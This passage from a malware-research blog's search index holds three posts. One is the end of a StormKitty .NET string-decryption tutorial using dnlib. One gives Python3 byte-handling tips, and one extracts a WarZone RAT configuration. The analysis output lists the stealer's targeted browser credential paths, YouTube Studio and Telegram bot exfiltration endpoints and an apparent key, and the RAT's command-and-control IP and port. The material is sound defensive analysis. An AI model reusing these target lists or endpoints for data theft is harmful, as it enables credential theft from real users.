Class71/Struct22 Class71::struct22_2 IL_0291: ldtoken Class71/Struct20 Class71::struct20_13 IL_02AC: ldtoken Class71/Struct20 Class71::A223DB41D9BFBC0280EBD0050A8BBD8EA7A943B251C8FD2D0B01A040462EDB0B IL_02C7: ldtoken Class71/Struct20 Class71::struct20_12 IL_02E2: ldtoken Class71/Struct20 Class71::struct20_23 IL_02FD: ldtoken Class71/Struct20 Class71::ACDF4A22C9359C1328E1CC966BC6C0D0D95B468AF46466FFAEC92C411050E17B IL_0318: ldtoken Class71/Struct20 Class71::A515425C81DC183149AF8B446E168A9509399B54129E92DAC27E19364B0D7B86 IL_0333: ldtoken Class71/Struct20 Class71::D3709EF761A0DEFC0ABE47CF9B3476718CE15F873291CF43E1AE3DC080DE5523 IL_034E: ldtoken Class71/Struct20 Class71::A981F5EDD35DDFF3F41F44A598272BBEAFA5F5B9C1595DC02FC6044CE81BE666 IL_0369: ldtoken Class71/Struct20 Class71::struct20_11 IL_0384: ldtoken Class71/Struct20 Class71::struct20_1 IL_039F: ldtoken Class71/Struct22 Class71::FD2AD7331099CFB7A118458E12965559ABF6D870A4B3DFF975FF43C3C56C09C8 IL_03C4: ldtoken Class71/Struct20 Class71::struct20_17 IL_03DE: ldtoken Class71/Struct19 Class71::struct19_0 IL_03F8: ldtoken Class71/Struct19 Class71::CEB1CC71FC33A5B2E3A8E0727D334A0B236251779D5BAF438C965B4FB341F460 IL_0412: ldtoken Class71/Struct19 Class71::A4956ED9AA7996A00C7593BFFCBDB3FBE5A11F729876DF9AC5A1A33EF3EFE3A2 IL_042C: ldtoken Class71/Struct20 Class71::A8F810D24584EC3B7929D304606C2DD1E44F852CA90C291ED8CC398AA3F07FD3 IL_0446: ldtoken Class71/Struct20 Class71::D170DC7768D26A111EF0E7B910988BFC4ACBCA3BE6A5B476EED1F48C70040F93 IL_0460: ldtoken Class71/Struct20 Class71::D61B7716B5AD4A42CC6C9300587B2C389EB40C3E8BF9B039E7DB98097247DC1B IL_047A: ldtoken Class71/Struct22 Class71::CAB1D35DDB8E2426F9750F1040D87B301146E2BFAB7CF292C14EC1133A2ACB37 IL_0497: ldtoken Class71/Struct20 Class71::struct20_0 IL_002D: ldtoken Class71/Struct23 Class71::B6BF689EB1506173FB29643B5E51D7E067FD5E191256B038EB618C2F593EB272 IL_00A8: ldtoken Class71/Struct20 Class71::struct20_16 IL_011B: ldtoken Class71/Struct20 Class71::D813E22A9B121801B05222D1BF9E349DAA549C1171C61A538CAD559E2701513B IL_01FB: ldtoken Class71/Struct23 Class71::struct23_2 IL_0302: ldtoken Class71/Struct23 Class71::A4327AC8803761C49FE829B97D8B2E262D38A165E20B7F7C9FDCD1F757CDB7BB IL_0092: ldtoken Class71/Struct20 Class71::struct20_5 IL_000E: ldtoken Class71/Struct20 Class71::B4066645CC9D38B322DDCD501F7863D2759D4CAA2A993694DCC6DDB1EEBC7301 IL_002E: ldtoken Class71/Struct23 Class71::struct23_0 IL_01C1: ldtoken Class71/Struct22 Class71::struct22_1 IL_0008: ldtoken Class71/Struct20 Class71::B28DB940EDE70686E870504AE41CB6EEAE634B9858DF6B5AEAB3958AA115A5E1 . Now that we have a way to find all of the arrays that contain the encrypted strings we need a way to get the data out of the array. This was very confusing when I was trying to figure it out... hat tip to https://twitter.com/s4tan for all the help &lt;3 . http://antonioparata.blogspot.com/2018/02/analyzing-nasty-net-protection-of.html | http://antonioparata.blogspot.com/2013/10/blog-post.html | . I&#39;m still not sure this is the best way to do things but basically we grab the first operand from the ldtoken instruction which is the token for the field that contains the array. Each array is stored in a field in a class so once we have the token we can search through all the fields in all the classes for the matching token and extract the data. To actually convert the byte array into something we can use in Python we call the get_InitialValue method for the field and convert this into a byte string. I think this works because the array is static making the initial value the actual value but I&#39;m not entirely sure. . To simplify the process I created a helper function that will allow us to find and extract the bytes string based on a token. . def get_array_data_by_token(token): for mtype in module.GetTypes(): if mtype.get_HasFields(): for field in mtype.get_Fields(): if field.get_MDToken() == token: try: return bytes(field.get_InitialValue()) except: return None return None . Now we have all the parts and we can put them together to extract and decrypt the strings! . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken ctxt = get_array_data_by_token(token) if ctxt != None: ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) ptxt = unpad(ptxt) print(ptxt) else: print(&quot;Error no array data found for %s&quot; % method.Body.Instructions[ptr-i]) . b&#39; Chromium User Data &#39; b&#39; Google Chrome User Data &#39; b&#39; Google(x86) Chrome User Data &#39; b&#39; Opera Software &#39; b&#39; MapleStudio ChromePlus User Data &#39; b&#39; Iridium User Data &#39; b&#39; 7Star 7Star User Data &#39; b&#39; CentBrowser User Data &#39; b&#39; Chedot User Data &#39; b&#39; Vivaldi User Data &#39; b&#39; Kometa User Data &#39; b&#39; Elements Browser User Data &#39; b&#39; Epic Privacy Browser User Data&#39; b&#39; uCozMedia Uran User Data &#39; b&#39; Fenrir Inc Sleipnir5 setting modules ChromiumViewer &#39; b&#39; CatalinaGroup Citrio User Data &#39; b&#39; Coowon Coowon User Data &#39; b&#39; liebao User Data &#39; b&#39; QIP Surf User Data &#39; b&#39; Orbitum User Data &#39; b&#39; Comodo Dragon User Data &#39; b&#39; Amigo User User Data &#39; b&#39; Torch User Data &#39; b&#39; Yandex YandexBrowser User Data &#39; b&#39; Comodo User Data &#39; b&#39; 360Browser Browser User Data &#39; b&#39; Maxthon3 User Data &#39; b&#39; K-Melon User Data &#39; b&#39; Sputnik Sputnik User Data &#39; b&#39; Nichrome User Data &#39; b&#39; CocCoc Browser User Data &#39; b&#39; Uran User Data &#39; b&#39; Chromodo User Data &#39; b&#39; Mail.Ru Atom User Data &#39; b&#39; BraveSoftware Brave-Browser User Data &#39; b&#39; Mozilla Firefox&#39; b&#39; Waterfox&#39; b&#39; K-Meleon&#39; b&#39; Thunderbird&#39; b&#39; Comodo IceDragon&#39; b&#39; 8pecxstudios Cyberfox&#39; b&#39; NETGATE Technologies BlackHaw&#39; b&#39; Moonchild Productions Pale Moon&#39; b&#39; Microsoft Edge User Data&#39; b&#39;https://studio.youtube.com/getAccountSwitcherEndpoint&#39; b&#39;https://www.youtube.com&#39; b&#39;https://studio.youtube.com&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/get?alt=json&amp;key=&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/esr?alt=json&amp;key=&#39; b&#39;vm7UdYrfFAJ7GRZxN8S9&#39; b&#39;http://api64.ipify.org&#39; b&#39;https://api.mylnikov.org/geolocation/wifi?v=1.1&amp;bssid=&#39; b&#39;https://www.google.com.ua/maps/place/&#39; b&#39;https://api.telegram.org/bot&#39; . Editing .NET Assembly . Success! Now that we have our string decryption working we can update our code to edit the sample and insert the decrypted strings. This process is is made very easy using dnlib. All we need to do is nop out the instructions that are used to build the encrypted string array and replace the call to the decryption function with a simple string load using the decrypted string. Since the instruction following decryption call expects the decrypted string to be on the stack we will load the decrypted string directly on the stack. Once this is done we will save the edited assembly to a new file. . . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue for ptr in range(len(method.Body.Instructions)): instruction = method.Body.Instructions[ptr] if instruction.OpCode == OpCodes.Call: if decryption_method_name in instruction.ToString(): # Found call now seach backwards a maximum of 5 instructions for ldtoken to get encrypted string for i in range(1,5): if method.Body.Instructions[ptr-i].OpCode == OpCodes.Ldtoken: mm = method.Body.Instructions[ptr-i] token = mm.Operand.MDToken ctxt = get_array_data_by_token(token) if ctxt != None: ptxt = decrypt(ctxt, key_bytes[:key_size_bytes], key_bytes[key_size_bytes:]) ptxt = unpad(ptxt) print(ptxt) # We need to nop out everything from OpCodes.Ldc_I4_S to the decryption call for j in range(1,10): if method.Body.Instructions[ptr-j].OpCode == OpCodes.Ldc_I4_S: while j &gt; 0: method.Body.Instructions[ptr-j].OpCode = OpCodes.Nop j -= 1 break # Replace decryption call with string load method.Body.Instructions[ptr].OpCode = OpCodes.Ldstr method.Body.Instructions[ptr].Operand = ptxt.decode(&#39;utf-8&#39;) else: print(&quot;Error no array data found for %s&quot; % method.Body.Instructions[ptr-i]) # we found the string no need to keep searching for instructions break # To avoid the Error calculating max stack value we can just keep old max stack method.Body.KeepOldMaxStack = True # Save edited assembly module.Write(SAMPLE_PATH + &quot;.decrypted&quot;) . b&#39; Chromium User Data &#39; b&#39; Google Chrome User Data &#39; b&#39; Google(x86) Chrome User Data &#39; b&#39; Opera Software &#39; b&#39; MapleStudio ChromePlus User Data &#39; b&#39; Iridium User Data &#39; b&#39; 7Star 7Star User Data &#39; b&#39; CentBrowser User Data &#39; b&#39; Chedot User Data &#39; b&#39; Vivaldi User Data &#39; b&#39; Kometa User Data &#39; b&#39; Elements Browser User Data &#39; b&#39; Epic Privacy Browser User Data&#39; b&#39; uCozMedia Uran User Data &#39; b&#39; Fenrir Inc Sleipnir5 setting modules ChromiumViewer &#39; b&#39; CatalinaGroup Citrio User Data &#39; b&#39; Coowon Coowon User Data &#39; b&#39; liebao User Data &#39; b&#39; QIP Surf User Data &#39; b&#39; Orbitum User Data &#39; b&#39; Comodo Dragon User Data &#39; b&#39; Amigo User User Data &#39; b&#39; Torch User Data &#39; b&#39; Yandex YandexBrowser User Data &#39; b&#39; Comodo User Data &#39; b&#39; 360Browser Browser User Data &#39; b&#39; Maxthon3 User Data &#39; b&#39; K-Melon User Data &#39; b&#39; Sputnik Sputnik User Data &#39; b&#39; Nichrome User Data &#39; b&#39; CocCoc Browser User Data &#39; b&#39; Uran User Data &#39; b&#39; Chromodo User Data &#39; b&#39; Mail.Ru Atom User Data &#39; b&#39; BraveSoftware Brave-Browser User Data &#39; b&#39; Mozilla Firefox&#39; b&#39; Waterfox&#39; b&#39; K-Meleon&#39; b&#39; Thunderbird&#39; b&#39; Comodo IceDragon&#39; b&#39; 8pecxstudios Cyberfox&#39; b&#39; NETGATE Technologies BlackHaw&#39; b&#39; Moonchild Productions Pale Moon&#39; b&#39; Microsoft Edge User Data&#39; b&#39;https://studio.youtube.com/getAccountSwitcherEndpoint&#39; b&#39;https://www.youtube.com&#39; b&#39;https://studio.youtube.com&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/get?alt=json&amp;key=&#39; b&#39;https://studio.youtube.com/youtubei/v1/att/esr?alt=json&amp;key=&#39; b&#39;vm7UdYrfFAJ7GRZxN8S9&#39; b&#39;http://api64.ipify.org&#39; b&#39;https://api.mylnikov.org/geolocation/wifi?v=1.1&amp;bssid=&#39; b&#39;https://www.google.com.ua/maps/place/&#39; b&#39;https://api.telegram.org/bot&#39; .",
            "url": "https://research.openanalysis.net/dot%20net/static%20analysis/stormkitty/dnlib/python/research/2021/07/14/dot_net_static_analysis.html",
            "relUrl": "/dot%20net/static%20analysis/stormkitty/dnlib/python/research/2021/07/14/dot_net_static_analysis.html",
            "date": " • Jul 14, 2021"
        }
        
    
  
    
        ,"post35": {
            "title": "Python3 Tips and Sample Code",
            "content": "Overview . Python2.7 is like second nature to me now and I keep getting hung up on the idiotic typing that Python3 has introduced. Hopefully these examples will help. . Binary Data and Hex Ecoding . import binascii string_example = &quot;test&quot; byte_array_example = b&quot;test&quot; # Convert string into bytes print(string_example.encode(&#39;utf-8&#39;)) # Convert byte array into string print(byte_array_example.decode(&#39;utf-8&#39;)) # Convert string into hex encoded byte array print(binascii.hexlify(string_example.encode(&#39;utf-8&#39;))) # Convert byte array into hex encoded byte array print(binascii.hexlify(byte_array_example)) # Convert byte array into hex encoded string print(binascii.hexlify(byte_array_example).decode(&#39;utf-8&#39;)) # Convert hex encoded byte array into ascii byte array hex_byte_array = b&#39;74657374&#39; print(binascii.unhexlify(hex_byte_array)) # Convert hex encoded string into ascii byte array hex_string = &#39;74657374&#39; print(binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;))) # Convert hex encoded string into ascii string hex_string = &#39;74657374&#39; print(binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)) . b&#39;test&#39; test b&#39;74657374&#39; b&#39;74657374&#39; 74657374 b&#39;test&#39; b&#39;test&#39; test . Hex Encoding Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Strings Functions . def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: pass return out def ascii_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;([%s]{%d,})&#39; % (ASCII_BYTE, n) ascii_re = re.compile(reg) out = [] for match in ascii_re.finditer(buf): try: out.append(match.group().decode(&quot;ascii&quot;)) except UnicodeDecodeError: pass return out . test_var = &quot;test&quot; print(test_var) . test .",
            "url": "https://research.openanalysis.net/python/python3/tips/research/2021/06/27/python3_examples.html",
            "relUrl": "/python/python3/tips/research/2021/06/27/python3_examples.html",
            "date": " • Jun 27, 2021"
        }
        
    
  
    
        ,"post36": {
            "title": "WarZone RAT",
            "content": "Overview . The config is stored in the .bss PE section with the following format. . Key length | key | data . import argparse import struct import pefile import re import binascii . Now a quick reminder ddof binary data hex encoding for Python3 . RC4 Encryption . The data is encrypted using RC4. For more information on RC4 check out our RC4 tutorial video. . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Helper functions . import binascii data = binascii.unhexlify(b&#39;&#39;) key = binascii.unhexlify(b&#39;&#39;) def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: continue return out def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct warzone_file = b&#39;/tmp/work/warzone.bin&#39; data = open(warzone_file, &#39;rb&#39;).read() pe = pefile.PE(data=data) section_data = None for s in pe.sections: if s.Name == b&#39;.bss x00 x00 x00 x00&#39;: section_data = s.get_data() ## size (DWORD) | key | data key_size = struct.unpack(&#39;&lt;I&#39;, section_data[:4])[0] key = section_data[4:4 + key_size] ctxt = section_data[4+key_size:] ctxt = ctxt.split(b&#39; x00 x00 x00 x00 x00 x00 x00 x00&#39;)[0] ptxt = rc4crypt(ctxt, key) host_len = struct.unpack(&#39;&lt;I&#39;, ptxt[:4])[0] host_wide = ptxt[4:host_len+4] c2_host = unicode_strings(host_wide)[0] c2_port = struct.unpack(&#39;&lt;H&#39;, ptxt[host_len+4:host_len+4+2])[0] print(&quot;host: %s, port: %d&quot; % (c2_host, c2_port)) . host: 165.22.5.66, port: 1111 .",
            "url": "https://research.openanalysis.net/warzone/malware/config/2021/05/31/warzone_rat_config.html",
            "relUrl": "/warzone/malware/config/2021/05/31/warzone_rat_config.html",
            "date": " • May 31, 2021"
        }
        
    
  

  
  

  

  
  

  

  
  

  

  
  

  
  

  

  

  
  

  
      ,"page11": {
          "title": "",
          "content": "Sitemap: {{ “sitemap.xml” | absolute_url }} | .",
          "url": "https://research.openanalysis.net/robots.txt",
          "relUrl": "/robots.txt",
          "date": ""
      }
      
  

}